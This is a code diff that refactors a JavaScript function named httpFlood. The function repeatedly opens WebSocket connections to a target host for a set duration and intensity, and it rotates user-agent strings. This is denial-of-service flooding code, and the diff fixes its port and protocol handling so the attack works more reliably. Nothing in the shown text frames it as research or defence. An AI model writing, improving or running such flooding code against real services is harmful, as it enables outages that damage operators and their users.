@@ -3,8 +3,15 @@ async function httpFlood(target, duration, intensity) {
     const url = new URL(target);
     const host = url.hostname;
     const path = url.pathname || '/';
-    const port = url.port || (url.protocol === 'https:' ? (url.protocol === 'wss:' ? 443 : 443) : 80);
-    const protocol = url.protocol === 'https:' ? 'https' : 'http';
+    let port = url.port;
+
+    if (!port) {
+      port = url.protocol === 'https:' || url.protocol === 'wss:' ? 443 : 80;
+    } else {
+      port = parseInt(port, 10);
+    }
+
+    const protocol = url.protocol === 'https:' || url.protocol === 'wss:' ? 'https' : 'http';
     const startTime = Date.now();
     const interval = Math.max(1, 50 / intensity);
     const userAgents = [
@@ -22,7 +29,9 @@ async function httpFlood(target, duration, intensity) {
     while (Date.now() - startTime < duration * 1000) {
       for (let i = 0; i < intensity; i++) {
         try {
-          const socket = new WebSocket(`${protocol === 'https' ? 'wss' : 'ws'}://${host}:${port}${path}`);
+          const isSecure = protocol === 'https';
+          const socketProtocol = isSecure ? 'wss' : 'ws';
+          const socket = new WebSocket(`${socketProtocol}://${host}:${port}${path}`);
 
           socket.onopen = () => {
             const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
